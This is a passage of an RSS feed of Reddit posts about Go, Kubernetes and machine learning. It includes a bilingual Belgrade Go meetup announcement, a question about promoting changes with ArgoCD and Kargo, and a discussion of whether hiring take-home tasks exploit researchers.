Shedding</title><link>https://medium.com/@Realblank/backpressure-patterns-in-go-from-channels-to-queues-to-load-shedding-0841c9fe5607</link><author>/u/Real_Blank</author><category>golang</category><category>reddit</category><pubDate>Wed, 21 Jan 2026 19:38:45 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Belgrade Go meetup - Thursday, Jan 29</title><link>https://www.meetup.com/golang-serbia/events/312819083/</link><author>/u/GaussCarl</author><category>golang</category><category>reddit</category><pubDate>Wed, 21 Jan 2026 19:28:44 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[Join us for the next Golang meetup on January 29th! We have two great talks:
We will explore how testing multiple variables can identify meaningful improvements in any project. As an example, we will see how it can inform game design decisions and identify most optimal game variation. At the end we will see how a testing framework can be implemented in Go.
ðŸ‡¬ðŸ‡§ The presentation will be in English.Desktop Applications with Go and Fyne
How to build a desktop application using Fyne. Pros and cons of UI development in Go, beginner-friendly, with practical demos. If you're interested in building Desktop applications in Go, this meetup is for you!
ðŸ‡·ðŸ‡¸ The presentation will be in Serbian.
Location: Finbet Belgrade Office, JuÅ¾ni bulevar 10, Belgrade
Please RSVP to help us with planning.
Pozivamo vas na naredni Golang meetup koji Ä‡e se odrÅ¾ati 29.01. Imamo dva sjajna predavanja:Multivarijantno testiranje
IstraÅ¾iÄ‡emo kako testiranje viÅ¡e promenljivih moÅ¾e da pomogne u otkrivanju znaÄajnih poboljÅ¡anja u bilo kom projektu. Kao primer, videÄ‡emo kako se ovaj pristup moÅ¾e koristiti za donoÅ¡enje odluka u dizajnu igara i za identifikovanje najoptimalnije varijante igre. Na kraju Ä‡emo videti kako se testing framework moÅ¾e implementirati u Go-u.
ðŸ‡¬ðŸ‡§ Prezentacija Ä‡e biti na engleskom jeziku.Desktop aplikacije sa Go i Fyne
Kako razviti desktop aplikaciju koristeÄ‡i Fyne. Prednosti i mane UI developmenta u Go-u, beginner-friendly, sa praktiÄnim demo primerima. Ako vas zanima pravljenje Desktop aplikacija u Go-u, ovo je meetup koji ne smete propustiti!
ðŸ‡·ðŸ‡¸ Prezentacija Ä‡e biti na srpskom jeziku.
Lokacija: Prostorije Finbet-a, JuÅ¾ni bulevar 10, Beograd
Molimo vas za RSVP kako bismo lakÅ¡e isplanirali dogaÄ‘aj.]]></content:encoded></item><item><title>RISC-V Kubernetes cluster with Jenkins on 3x StarFive VisionFive 2 (Lite)</title><link>https://youtube.com/watch?v=641TnJyHt4g&amp;amp;si=AqXuJ3-A5M7PkQjS</link><author>/u/Opvolger</author><category>reddit</category><pubDate>Wed, 21 Jan 2026 17:53:51 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>ArgoCD / Kargo + GitOps Help/Suggestions</title><link>https://www.reddit.com/r/kubernetes/comments/1qj4dyt/argocd_kargo_gitops_helpsuggestions/</link><author>/u/pixel-pusher-coder</author><category>reddit</category><pubDate>Wed, 21 Jan 2026 17:33:52 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[I've been running an argocd setup that seems to work pretty well. The main issue I had with it was that testing a deployment on say staging involves pushing to git main in order to get argo to apply my changes. I'm trying to avoid using labels. I know there's patterns that use that, but if the data is not in git to me that defeats the point. So I looked and a few GitOps solutions and Kargo seemed to be the most interesting one. The basic flow seems to be pretty slick. Watch for changes (Warehouse), creates a change-set (Freight) and Promote the change to the given Stage. The main thing that seems to be missing is applying a diff for a given environment that has both a version change AND a config change. So say I have a new helm chart with some breaking changes. I'd like to configure some values.yaml changes for say staging and update to version 2.x and promote those together to staging. If that works, It would be nice to apply the diff to prod, then staging, etc. It feels like Kargo only supports artifacts without say git/config changes. How do people manage this? If I have to do a PR for each env that won't be reflected till they get merged, then you might as well just update the version in your PR. The value add of kargo seems pretty minor at that point.Am I missing something? How to you take a change and promote it through various stages? Right now I'm just committing to main since everything is staging still but that doesn't seem like a proper pattern. ]]></content:encoded></item><item><title>[D] Do you feel like companies are scooping / abusing researchers for ideas during hiring for researcher roles?</title><link>https://www.reddit.com/r/MachineLearning/comments/1qj3t98/d_do_you_feel_like_companies_are_scooping_abusing/</link><author>/u/quasiproductive</author><category>ai</category><category>reddit</category><pubDate>Wed, 21 Jan 2026 17:13:24 +0000</pubDate><source url="https://www.reddit.com/r/MachineLearning/top/?sort=top&amp;t=day&amp;limit=3">Reddit - ML</source><content:encoded><![CDATA[After having gone through at least 3 rounds where I had to present research solutions for problems, I get the feeling that I'm doing free labour for these guys. They usually give you a week and given the current glut of candidates, it feels like this could easily be happening in the background. This includes Mid tech companies (not FAANG) and startups. Is there some truth to this suspicion?For the most recent one, I purposefully chose not to dive into the advanced literature heavy stuff even though I did do the work. The scope of the task was pretty vague ("design an ML system blah blah") and as soon as I started my presentation, one of my interviewers immediately questioned me about whether I had read the literature and wasn't interested in older approaches to the same problem. The rest of the interview was spent getting grilled, as is usual. My motivation was to work bottom up and demonstrate strong fundamentals. Perhaps, I'm missing something here]]></content:encoded></item></channel></rss>